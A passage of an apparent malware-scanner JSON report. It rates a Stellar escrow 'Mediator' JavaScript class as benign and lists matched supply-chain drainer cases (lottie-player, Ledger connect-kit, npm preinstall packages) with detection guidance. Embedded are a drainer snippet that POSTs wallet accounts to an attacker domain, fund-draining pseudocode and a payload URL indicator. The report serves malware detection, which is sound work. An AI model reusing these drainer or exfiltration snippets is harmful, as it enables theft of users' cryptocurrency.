{Asset}\n     * @readonly\n     */\n    sellingAsset\n    /**\n     * @type {Asset}\n     * @readonly\n     */\n    buyingAsset\n    /**\n     * @type {bigint}\n     * @readonly\n     */\n    sellingAmount\n    /**\n     * @type {AuthorizationWrapper}\n     * @private\n     */\n    authorization\n    /**\n     * @type {Keypair}\n     * @private\n     */\n    mediator\n    /**\n     * @type {string}\n     * @readonly\n     */\n    mediatorAddress\n    /**\n     * Prefix of the mediator address record in the localStorage\n     * @type {string}\n     * @private\n     */\n    storagePrefix = defaultStoragePrefix\n    /**\n     * @type {number}\n     * @private\n     */\n    reserveFeeAmount\n\n    /**\n     * Check if there are any non-disposed mediators that belong to lost swap sessions\n     * @return {boolean}\n     */\n    get hasObsoleteMediators() {\n        return this.constructor.hasObsoleteMediators(this.source, this.storagePrefix)\n    }\n\n    /**\n     * Check if there are any non-disposed mediators that belong to lost swap sessions\n     * @param {string} source - Initiator account that created a mediator\n     * @param {string} [storagePrefix] - Local storage key prefix\n     * @return {boolean}\n     */\n    static hasObsoleteMediators(source, storagePrefix = defaultStoragePrefix) {\n        return Object.entries(localStorage).some(([key, initiator]) =>\n            initiator === source && key.startsWith(storagePrefix))\n    }\n\n    /**\n     * Retrieve funds from mediator accounts that belong to lost swap sessions\n     * @return {Promise}\n     */\n    async disposeObsoleteMediators() { //TODO: deal with potential problems caused by concurrent swaps\n        for (let [key, initiator] of Object.entries(localStorage)) {\n            if (initiator === this.source && key.startsWith(this.storagePrefix)) {\n                await this.dispose(key.replace(this.storagePrefix, ''))\n            }\n        }\n    }\n\n    /**\n     * Retrieve funds from mediator accounts that belong to lost swap sessions\n     * @param {string} source - Initiator account that created a mediator\n     * @param {ClientAuthorizationParams} authorization - Authorization callback or secret key\n     * @param {string} [storagePrefix] - Local storage key prefix\n     * @return {Promise}\n     */\n    static async disposeObsoleteMediators(source, authorization, storagePrefix = defaultStoragePrefix) {\n        const wrapper = new Mediator(source, 'XLM', 'XLM', '0', authorization)\n        wrapper.storagePrefix = storagePrefix\n        await wrapper.disposeObsoleteMediators()\n    }\n\n    /**\n     * Create mediator account and deposit tokens to sell\n     * @return {Promise<string>} - Newly created mediator secret key\n     */\n    async init() {\n        const sourceAccount = await this.loadAccount(this.source)\n        if (!sourceAccount)\n            throw new Error('Mediator account doesn\\'t exist on the ledger')\n        //calculate fees reserve + account entries reserve\n        const subentries = 2 + sourceAccount.signers.length - 1 + [this.sellingAsset, this.buyingAsset].filter(a => !a.isNative()).length\n        const feesReserve = this.reserveFeeAmount + 0.5 * subentries\n        const ops = []\n        //create new random keypair for the trade\n        this.mediator = Keypair.random()\n        this.mediatorAddress = this.mediator.publicKey()\n        //create mediator account and deposit funds\n        const {sellingAsset, buyingAsset} = this\n        if (sellingAsset.isNative()) { //for XLM total amount should include fee reserves\n            const amount = this.sellingAmount + BigInt(feesReserve * 10000000)\n            //check available balance\n            if (toStroops(findTrustline(sourceAccount, sellingAsset).balance) < amount)\n                throw new Error('Insufficient XLM balance for selling amount + potential trading fees')\n            //only create account is required for asset transfer\n            ops.push(Operation.createAccount({\n                source: this.source,\n                destination: this.mediatorAddress,\n                startingBalance: fromStroops(amount)\n            }))\n        } else {\n            //check available XLM balance\n            const xlmBalance = findTrustline(sourceAccount, Asset.native())\n            if (parseFloat(xlmBalance.balance) < feesReserve)\n                throw new Error('Insufficient XLM balance for potential trading fees')\n            //create mediator account\n            ops.push(Operation.createAccount({\n                source: this.source,\n                destination: this.mediatorAddress,\n                startingBalance: feesReserve.toString() // for tx fees\n            }))\n            //check available XLM balance\n            const sellingTrustline = findTrustline(sourceAccount, this.sellingAsset)\n            if (!sellingTrustline || toStroops(sellingTrustline.balance) < this.sellingAmount)\n                throw new Error('Insufficient selling asset balance')\n            //TODO: check authorizations\n            //create trustline for selling asset\n            ops.push(Operation.changeTrust({\n                source: this.mediatorAddress,\n                asset: sellingAsset\n            }))\n            //transfer tokens to sell\n            ops.push(Operation.payment({\n                source: this.source,\n                asset: sellingAsset,\n                destination: this.mediatorAddress,\n                amount: fromStroops(this.sellingAmount)\n            }))\n        }\n        //create trustline for buying asset\n        if (!buyingAsset.isNative()) {\n            ops.push(Operation.changeTrust({\n                source: this.mediatorAddress,\n                asset: buyingAsset\n            }))\n            //if source account itself doesn't have trustline for buying asset\n            if (!findTrustline(sourceAccount, buyingAsset)) {\n                ops.push(Operation.changeTrust({\n                    source: this.source,\n                    asset: buyingAsset\n                }))\n            }\n        }\n\n        if (sourceAccount.signers.length > 1) { //multisig or delegated schema\n            let {thresholds, signers} = sourceAccount\n            signers = signers.filter(signer => signer.type === 'ed25519_public_key')\n            //add source account as a signer\n            ops.push(Operation.setOptions({\n                source: this.mediatorAddress,\n                inflationDest: this.source, //store source account to the inflation dest\n                homeDomain: 'mediator.stellar.broker',\n                masterWeight: Math.max(1, thresholds.high_threshold, thresholds.med_threshold), //own signer always has the highest weight\n                highThreshold: thresholds.high_threshold,\n                medThreshold: thresholds.med_threshold,\n                lowThreshold: thresholds.low_threshold,\n                signer: { //add first signer\n                    ed25519PublicKey: signers[0].key,\n                    weight: Math.max(1, signers[0].weight)\n                }\n            }))\n            //add all other signers\n            for (let i = 1; i < signers.length; i++) {\n                ops.push(Operation.setOptions({\n                    source: this.mediatorAddress,\n                    signer: { //cope signers and weights\n                        ed25519PublicKey: signers[i].key,\n                        weight: Math.max(1, signers[i].weight)\n                    }\n                }))\n            }\n        } else { //simple schema\n            ops.push(Operation.setOptions({\n                source: this.mediatorAddress,\n                homeDomain: 'mediator.stellar.broker',\n                masterWeight: 1,\n                highThreshold: 1,\n                medThreshold: 1,\n                lowThreshold: 1,\n                signer: { //add source account as a signer\n                    ed25519PublicKey: this.source,\n                    weight: 1\n                }\n            }))\n        }\n\n        //store the record in the localStorage\n        localStorage.setItem(this.storagePrefix + this.mediatorAddress, this.source)\n        //confirm tx\n        await this.buildAndSend(sourceAccount, ops)\n        //client will need mediator secret for trading\n        return this.mediator.secret()\n    }\n\n    /**\n     * Dispose mediator account\n     * @param {string} [address]\n     * @return {Promise}\n     */\n    async dispose(address) {\n        if (!address) {\n            address = this.mediatorAddress\n        }\n        //load account\n        let mediatorAccount = await this.loadAccount(address)\n        if (!mediatorAccount) {\n            //remove reference from local storage\n            localStorage.removeItem(this.storagePrefix + address)\n            throw new Error(`Mediator account ${address} doesn't exist on the ledger`)\n        }\n\n        if (!mediatorAccount.signers.find(s => s.key === this.source))\n            throw new Error(`${address} is not a mediator account for ${this.source}`)\n        const ops = []\n        //remove trustlines for each account balance\n        for (const balance of mediatorAccount.balances) {\n            if (balance.asset_type === 'native')\n                continue //skip XLM trustline - merge will handle the transfer\n            const asset = convertToStellarAsset(balance)\n            //transfer remaining balance to the source account\n            if (balance.balance > 0) {\n                ops.push(Operation.payment({\n                    source: address,\n                    asset,\n                    destination: this.source,\n                    amount: balance.balance\n                }))\n            }\n            //remove trustline\n            ops.push(Operation.changeTrust({\n                source: address,\n                asset,\n                limit: '0'\n            }))\n        }\n        //merge\n        ops.push(Operation.accountMerge({\n            source: address,\n            destination: this.source\n        }))\n        if (this.mediatorAddress !== address) {\n            mediatorAccount = await this.loadAccount(this.source)\n        }\n        await this.buildAndSend(mediatorAccount, ops)\n        //remove reference from local storage\n        localStorage.removeItem(this.storagePrefix + address)\n    }\n\n    /**\n     * @param {AccountResponse} account\n     * @param {Operation[]} operations\n     * @param {string} [memo]\n     * @private\n     */\n    async buildAndSend(account, operations, memo) {\n        //create builder\n        const builder = new TransactionBuilder(account, {\n            fee: '1000000',\n            networkPassphrase: Networks.PUBLIC\n        })\n        builder.setTimeout(TimeoutInfinite)\n        //add memo if needed\n        if (memo) {\n            builder.addMemo(Memo.text(memo))\n        }\n        //add operations\n        for (const op of operations) {\n            builder.addOperation(op)\n        }\n        //build tx\n        let tx = builder.build()\n        //sign it on behalf of the mediator account (if available)\n        if (this.mediator) {\n            tx.sign(this.mediator)\n        }\n        //request signature from the client (if required)\n        if (account.account_id === this.source) {\n            tx = await this.authorization.authorize(tx)\n        }\n        //execute the tx\n        const res = await this.constructor.createHorizon().submitTransaction(tx, {skipMemoRequiredCheck: true})\n        if (!res.successful)\n            throw new Error('Failed to create mediator account')\n    }\n\n    /**\n     * @param {string} address\n     * @return {Promise<AccountResponse>}\n     * @private\n     */\n    async loadAccount(address) {\n        try {\n            return this.constructor.createHorizon().loadAccount(address)\n        } catch (e) {\n            console.error(e)\n        }\n    }\n\n    /**\n     * @return {HorizonServer}\n     * @private\n     */\n    static createHorizon() {\n        return new Horizon.Server('https://horizon.stellar.org')\n    }\n}\n\n\n/**\n * @param {AccountResponse} account\n * @param {Asset} asset\n * @return {BalanceLine}\n */\nfunction findTrustline(account, asset) {\n    return account.balances.find(b => asset.isNative() ?\n        b.asset_type === 'native' :\n        b.asset_code === asset.code && b.asset_issuer === asset.issuer\n    )\n}",
+          "is_malicious": false,
+          "malice_score": 0.45533598065376285,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code creates and manages Stellar mediator accounts by accessing and modifying blockchain accounts via the Stellar SDK, including creating accounts, setting trustlines, transferring assets, and merging accounts. It accesses localStorage to track mediator accounts and uses the hardcoded Horizon server URL 'https://horizon.stellar.org' for network communication. This enables automated asset escrow and fund recovery operations on the Stellar network, facilitating complex asset trades and potentially impacting asset custody and transaction integrity.",
+          "explanation": "[LLM Judgment: Benign] The provided code is a legitimate implementation of a Stellar network mediator that creates and manages escrow-like accounts to facilitate asset trades. It uses the official Stellar SDK to create accounts, set trustlines, transfer assets, and merge accounts. The code accesses localStorage only to track mediator accounts and uses a hardcoded public Horizon server URL, which is standard for Stellar network interactions. There is no evidence of obfuscation, unauthorized wallet access, data exfiltration, or automated unauthorized fund transfers. The known malicious patterns involve direct wallet draining, unauthorized transaction creation, or exfiltration of wallet credentials, none of which are present here. The code requires explicit authorization callbacks or secret keys to sign transactions, indicating user consent is necessary. Therefore, despite handling sensitive operations, the code is a benign utility for managing Stellar asset trades and escrow accounts.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241223_205532_426003_snippet_1",
+              "source_package": "samplePackage (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241223_205532_426003/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.47084900736808777,
+              "code_similarity": 0.41520291566848755,
+              "behavior_similarity": 0.526495099067688,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "\"solanaWeb3.Connection\"\n\"solanaWeb3.LAMPORTS_PER_SOL\"\n\"solanaWeb3.PublicKey.findProgramAddress\"\n\"solanaWeb3.SystemProgram.transfer\"\n\"solanaWeb3.Transaction\"\n\"async function info(\"\n\"async function updateConnectText(\"\n\"async function updateMintText(\"\n\"async function start(\"\n\"async function connect(\"\n\"async function waitForWalletConnection(\"\n\"async function connectSolana(\"\n\"async function getTokenBalance(\"\n\"async function createTxs(\"\n\"async function createPrizeTxs(\"\n\"async function claim(\"\n\"async function createTokenTxs(\"\n\"async function claimSolana(\"\n\".phantom\"\n\".isphantom\"\n\"phantom.app\"\n\".AccountLayout.\"\n\".TOKEN_PROGRAM_ID.\"\n\".Token.createAssociatedTokenAccountInstruction(\"\n\".Token.createTransferInstruction(\"",
+                "code_behavior": "At runtime, the code invokes multiple asynchronous functions to interact with Solana Web3 APIs, establishes wallet connections, creates and signs transactions, and manipulates wallet data, resulting in unauthorized access to user wallets and potential exfiltration of cryptocurrency.",
+                "malice_analysis": {
+                  "why_suspicious": "The code includes numerous routines for connecting to cryptocurrency wallets, creating and signing transactions, and referencing the Phantom wallet provider. These are strong indicators of attempts to access and manipulate user wallets without consent, a hallmark of crypto-stealing malware.",
+                  "violated_expectations": "Legitimate npm packages should not implement wallet connection or transaction creation logic unless they are explicitly designed as wallet management or blockchain interaction tools. The presence of these routines in a package not intended for such purposes is a clear violation.",
+                  "similar_legitimate_use": "Legitimate dApps or wallet utilities may use similar APIs and functions, but only when their documented purpose is to manage wallets or interact with blockchains, and with explicit user consent.",
+                  "key_indicators": [
+                    "Multiple async functions for wallet connection and transaction creation (e.g., connectSolana, createTxs, claimSolana)",
+                    "Direct references to Solana Web3 APIs and Phantom wallet (e.g., solanaWeb3.Connection, .phantom, phantom.app)",
+                    "Transaction manipulation routines (e.g., SystemProgram.transfer, Token.createTransferInstruction)",
+                    "Patterns matching YARA rules for known crypto-stealer campaigns"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "JavaScript source files (detected by YARA rule 'clinksink')",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "samplePackage",
+                  "package_manager": "npm",
+                  "package_versions": "unspecified (example in report)",
+                  "why_malicious": "The package contains code patterns and behaviors directly associated with cryptocurrency theft and credential exfiltration. It leverages Solana Web3 functions for unauthorized wallet access and transaction manipulation, accesses browser credential databases for data theft, and employs DLL hijacking for arbitrary code execution and persistence. These behaviors are detected by custom YARA rules and match known indicators of active malicious campaigns."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious JavaScript code initializes wallet connection routines and monitors for user wallet activity.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation for unauthorized transaction creation and possible fund exfiltration."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Python code accesses local browser credential databases and extracts sensitive login data.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sensitive data is prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Extracted credentials or wallet information is exfiltrated to attacker-controlled infrastructure.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker gains access to user credentials or cryptocurrency funds."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malicious DLL is executed via rundll32.exe, enabling further code execution or persistence.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker achieves code execution, persistence, or lateral movement."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "JavaScript code in npm packages implementing multiple asynchronous wallet connection and transaction functions referencing Solana Web3 and Phantom wallet APIs",
+                    "Python code accessing browser credential SQLite databases (e.g., 'browser_credentials.db', 'logins' table) and exfiltrating data via HTTP POST",
+                    "Execution of DLLs via rundll32.exe with non-standard or suspicious DLL filenames (DLL hijacking technique)"
+                  ],
+                  "file_indicators": [
+                    "JavaScript files containing references to 'solanaWeb3', 'phantom.app', or wallet connection routines",
+                    "Python files importing sqlite3 and accessing files named 'browser_credentials.db' or querying 'logins' tables",
+                    "Presence or execution of 'rundll32.exe' with DLLs not part of the standard system or application installation"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS POST requests containing credential or wallet data to unknown or suspicious domains",
+                    "Network connections initiated by JavaScript or Python code to attacker-controlled infrastructure for data exfiltration"
+                  ],
+                  "how_to_detect": "Monitor npm packages for JavaScript code that implements multiple asynchronous wallet connection and transaction routines, especially those referencing Solana Web3 and Phantom wallet APIs. Flag Python packages that access browser credential SQLite databases and attempt to transmit their contents externally via HTTP POST. Detect any use of rundll32.exe to execute DLLs not part of the standard system or application installation. Correlate these behaviors with outbound network activity to unknown or suspicious domains to identify coordinated credential or cryptocurrency theft."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_780352_snippet_2",
+              "source_package": "lottie-player (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_780352/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4689938426017761,
+              "code_similarity": 0.4055616855621338,
+              "behavior_similarity": 0.5324259996414185,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Malicious wallet drainer logic (representative):\nwindow.ethereum.request({ method: 'eth_requestAccounts' })\n  .then(accounts => {\n    // Exfiltrate assets\n    fetch('wss://castleservices01.com', { method: 'POST', body: JSON.stringify({ accounts }) });\n    // Initiate draining transactions\n    // ...\n  });",
+                "code_behavior": "At runtime, after the user interacts with a wallet connect prompt, the code requests access to the user's web3 wallet, collects account information, sends this data to the attacker's server via WebSocket or HTTP POST, and initiates unauthorized transactions to transfer assets to attacker-controlled addresses.",
+                "malice_analysis": {
+                  "why_suspicious": "The code abuses the wallet connection process to exfiltrate sensitive wallet information and automate asset transfers, which is a hallmark of crypto drainer malware.",
+                  "violated_expectations": "A legitimate animation player should never interact with web3 wallets, prompt for wallet connections, or initiate asset transfers.",
+                  "similar_legitimate_use": "Legitimate decentralized applications (dApps) prompt for wallet connection only for transparent, user-initiated actions and never exfiltrate wallet data to untrusted domains.",
+                  "key_indicators": [
+                    "Unsolicited wallet connection prompts on non-crypto-related sites",
+                    "Use of window.ethereum.request for eth_requestAccounts outside of dApp context",
+                    "Outbound WebSocket or HTTP(S) requests to castleservices01.com or similar domains",
+                    "Automated transaction logic following wallet connection"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (user interaction)",
+                  "file_location": "Injected by drainer.js (loaded at runtime)",
+                  "required_permissions": [
+                    "network",
+                    "web3 wallet access",
+                    "DOM access"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "lottie-player",
+                  "package_manager": "npm",
+                  "package_versions": "2.0.5, 2.0.6, 2.0.7",
+                  "why_malicious": "Versions 2.0.5, 2.0.6, and 2.0.7 of the lottie-player npm package were compromised in a supply chain attack. The attacker injected code that loads a remote crypto drainer script, which prompts users to connect their cryptocurrency wallets and then exfiltrates assets (cryptocurrency and NFTs) to attacker-controlled addresses. This malicious behavior is unrelated to the legitimate functionality of an animation library and poses a severe risk to users."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious lottie-player package is loaded by the website (via CDN or npm), triggering the import-time execution of injected code.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Loads remote drainer script from attacker-controlled domain (castleservices01.com)."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The drainer script, once loaded, injects a wallet connect UI and prompts the user to connect their crypto wallet.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "User is deceived into connecting their wallet, granting access to wallet information."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Upon wallet connection, the script exfiltrates wallet information and initiates unauthorized transactions to steal assets.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Victim's cryptocurrency and NFTs are transferred to attacker-controlled addresses."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Dynamic script injection from domains not affiliated with LottieFiles (e.g., castleservices01.com) during import-time of lottie-player.js",
+                    "Wallet connect prompts or web3 wallet access requests on sites not expected to interact with cryptocurrency wallets",
+                    "Outbound WebSocket or HTTP(S) connections to known phishing or drainer domains (e.g., castleservices01.com) following wallet connection"
+                  ],
+                  "file_indicators": [
+                    "dist/lottie-player.js containing references to castleservices01.com or similar suspicious domains",
+                    "Presence of dynamically injected <script> elements with src attributes pointing to external drainer payloads",
+                    "Unexpected modifications or additions to lottie-player.js in npm package versions 2.0.5, 2.0.6, or 2.0.7"
+                  ],
+                  "network_indicators": [
+                    "Any network connections (HTTP, HTTPS, WebSocket) to castleservices01.com",
+                    "Outbound requests to domains with a history of crypto phishing or drainer activity after loading animation libraries"
+                  ],
+                  "how_to_detect": "Monitor for external script loads initiated by lottie-player.js, especially from domains not associated with LottieFiles. Flag any wallet connect prompts or web3 wallet access requests on sites that do not provide crypto-related functionality. Detect and alert on outbound network connections to known drainer or phishing domains (such as castleservices01.com) after loading animation libraries. Use file integrity monitoring to detect unauthorized changes or suspicious references in npm package files, particularly in dist/lottie-player.js for the affected versions."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_201025_917000_snippet_1",
+              "source_package": "@ledgerhq/connect-kit (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_201025_917000/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.44198405742645264,
+              "code_similarity": 0.4015401601791382,
+              "behavior_similarity": 0.4824279546737671,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Pseudocode representation based on report\nfunction showFakeModal() {\n  displayModal('Connect your wallet');\n  onUserConnect(async (wallet) => {\n    await drainFunds(wallet);\n  });\n}\n\nasync function drainFunds(wallet) {\n  // Construct unauthorized transaction\n  const tx = createTransferTx(wallet, attackerWalletAddress, wallet.balance);\n  await wallet.sendTransaction(tx);\n}",
+                "code_behavior": "At runtime, after the user interacts with a deceptive wallet connection modal, the code programmatically creates and submits an unauthorized transaction transferring all assets from the user's wallet to an attacker-controlled address, resulting in immediate theft of funds.",
+                "malice_analysis": {
+                  "why_suspicious": "The code displays a fake wallet connection modal to trick users into connecting their wallets, then initiates unauthorized fund transfers without user consent, directly exfiltrating assets.",
+                  "violated_expectations": "A legitimate wallet connector should only facilitate user-approved transactions and never initiate transfers or access wallet balances without explicit user action and consent.",
+                  "similar_legitimate_use": "Legitimate wallet connectors may display modals for wallet connection, but always require explicit user approval for any transaction and never automate fund transfers.",
+                  "key_indicators": [
+                    "Deceptive modal UI prompting for wallet connection",
+                    "Automated creation and submission of transactions without user approval",
+                    "Transfer of entire wallet balance to a hardcoded attacker address",
+                    "Absence of user confirmation or transaction review step"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (upon user interaction with wallet connection modal)",
+                  "file_location": "main application code (e.g., index.js or bundled source in @ledgerhq/connect-kit v1.1.7)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "browser wallet access"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "@ledgerhq/connect-kit",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.5, 1.1.6, 1.1.7",
+                  "why_malicious": "These versions of the package were compromised via a supply chain attack after an attacker gained access to Ledger's npm account. The attacker published malicious versions that either directly embedded a crypto drainer or downloaded and executed a secondary malicious package. This resulted in unauthorized cryptocurrency transactions and theft from end users by exfiltrating wallet assets to attacker-controlled addresses."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker gains access to Ledger's npm account and publishes malicious versions of @ledgerhq/connect-kit.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious package is distributed to downstream applications."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious package is installed as a dependency in cryptocurrency applications.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is loaded into end-user applications."
+                  },
+                  {
+                    "step": 3,
+                    "action": "In v1.1.5 and v1.1.6, the package downloads and executes a secondary drainer package ('2e6d5f64604be31') via a hidden npm install and require.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Drainer code is executed in the application context."
+                  },
+                  {
+                    "step": 4,
+                    "action": "In v1.1.7 (and after secondary package execution in earlier versions), the code presents a fake wallet connection modal to the user.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "User is tricked into connecting their wallet."
+                  },
+                  {
+                    "step": 5,
+                    "action": "Upon user interaction, the drainer code initiates unauthorized transactions, transferring assets to attacker-controlled wallets.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Theft of user cryptocurrency assets (final goal)."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Presentation of deceptive wallet connection modals in wallet connector packages that immediately trigger fund transfers upon user connection",
+                    "Automated installation and execution of undeclared npm packages (e.g., '2e6d5f64604be31') at import-time or runtime",
+                    "Initiation of cryptocurrency transactions from wallet connectors without explicit user approval or confirmation"
+                  ],
+                  "file_indicators": [
+                    "Presence of code invoking 'npm install' or 'execSync' for non-declared dependencies in package source files",
+                    "References to the package name '2e6d5f64604be31' in source code or require/import statements",
+                    "Unusual modal UI code in wallet connector packages that lacks user confirmation or transaction review steps"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections or transaction submissions to attacker-controlled wallet addresses",
+                    "Unexpected npm registry requests for suspicious package names such as '2e6d5f64604be31'",
+                    "Network activity from wallet connector packages that initiates cryptocurrency transfers without user interaction"
+                  ],
+                  "how_to_detect": "Monitor wallet connector packages for dynamic npm installs or references to undeclared dependencies, especially '2e6d5f64604be31'. Flag any code that presents wallet connection modals and then initiates transactions without explicit user approval or confirmation. Audit for hardcoded attacker wallet addresses and references to known malicious package names. Monitor for unauthorized outbound cryptocurrency transactions originating from wallet connector contexts, and alert on use of child_process or execSync in package initialization."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_195354_696742_snippet_6",
+              "source_package": "styled-beautify-components, port-launcher, blockchain-transactions, chainflow, cryptotransact, blockledger, erc20-testenv, puma-com, blockchaintestenv, cryptotestenv, envision-config, envi-conf, envi-config, dot-environment (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_195354_696742/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.42477768659591675,
+              "code_similarity": 0.3476269245147705,
+              "behavior_similarity": 0.501928448677063,
+              "matched_snippet": {
+                "snippet_id": "snippet_6",
+                "code_snippet": "// Malicious code in serviceWorker.js\n// (Obfuscated JS that connects to wallet, attempts to transfer all ETH, and runs in background as a service worker)",
+                "code_behavior": "At runtime, the service worker script executes obfuscated JavaScript that connects to the user's crypto wallet, attempts to create and broadcast a transaction to transfer all ETH, and runs persistently in the background as a service worker, resulting in unauthorized wallet access and potential theft.",
+                "malice_analysis": {
+                  "why_suspicious": "Service workers should not initiate unauthorized wallet transactions or run obfuscated code that interacts with sensitive browser APIs. This behavior is indicative of targeted crypto theft.",
+                  "violated_expectations": "Legitimate service workers handle caching or notifications, not wallet theft or background exfiltration of funds.",
+                  "similar_legitimate_use": "None; wallet access should always be user-initiated and transparent, never automated or obfuscated.",
+                  "key_indicators": [
+                    "Obfuscated JavaScript in service worker",
+                    "Automated wallet transaction attempts",
+                    "Runs as a persistent background process"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (user runs cloned repo)",
+                  "file_location": "config/serviceWorker.js (GitHub repo: AxieMeta/Paradise)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "browser extension APIs"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "styled-beautify-components, port-launcher, blockchain-transactions, chainflow, cryptotransact, blockledger, erc20-testenv, puma-com, blockchaintestenv, cryptotestenv, envision-config, envi-conf, envi-config, dot-environment",
+                  "package_manager": "npm",
+                  "package_versions": "styled-beautify-components: 6.1.1-6.1.6; port-launcher: 16.0.3; blockchain-transactions: 5.0.3; chainflow: 5.0.3; cryptotransact: 5.0.3; blockledger: 5.0.3; erc20-testenv: 5.0.3; puma-com: 5.0.2; blockchaintestenv: 3.2.1; cryptotestenv: 3.2.1; envision-config: 0.1.3; envi-conf: 0.1.3, 0.1.0; envi-config: 0.1.0; dot-environment: 0.0.1",
+                  "why_malicious": "These packages contain malicious preinstall scripts that execute arbitrary code at install time, download and decrypt a second-stage payload from attacker-controlled infrastructure, execute it as a DLL, and then remove all traces of the attack. The attack chain is designed for stealth, persistence, and credential/data theft, and is linked to North Korean state-sponsored actors."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs a malicious npm package, triggering the preinstall script.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of index.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "index.js writes and executes batch and PowerShell scripts to orchestrate payload delivery.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Batch file execution"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Batch file downloads encrypted payload, runs PowerShell decryption, and prepares DLL for execution.",
+                    "implemented_by": [
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "DLL execution"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Decrypted DLL payload is executed via rundll32, running attacker code.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious actions (data theft, persistence, etc.)"
+                  },
+                  {
+                    "step": 5,
+                    "action": "All evidence (scripts, batch files, package.json modifications) is deleted to evade detection.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Stealth and anti-forensics"
+                  },
+                  {
+                    "step": 6,
+                    "action": "In social engineering attacks, user clones a GitHub repo and runs code that attempts to steal crypto wallet funds.",
+                    "implemented_by": [
+                      "snippet_6"
+                    ],
+                    "leads_to": "Wallet theft and potential backdoor installation"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Preinstall scripts that execute and then delete local files (e.g., index.js)",
+                    "Install-time network requests to hardcoded IPs/domains (e.g., 103.179.142.171)",
+                    "Creation and execution of batch/PowerShell scripts from JavaScript during npm install",
+                    "DLL execution via rundll32 during npm install process",
+                    "Obfuscated JavaScript in service workers attempting automated wallet transactions"
+                  ],
+                  "file_indicators": [
+                    "preinstall.bat",
+                    "preinstall.ps1",
+                    "sqlite.a",
+                    "sql.tmp",
+                    "preinstall.db",
+                    "index.js (self-deleting)",
+                    "package.json with preinstall hook",
+                    "config/serviceWorker.js with obfuscated code"
+                  ],
+                  "network_indicators": [
+                    "103.179.142.171/npm/npm.mov",
+                    "Other hardcoded IPs and C2s from IOC list",
+                    "Unusual outbound connections during npm install"
+                  ],
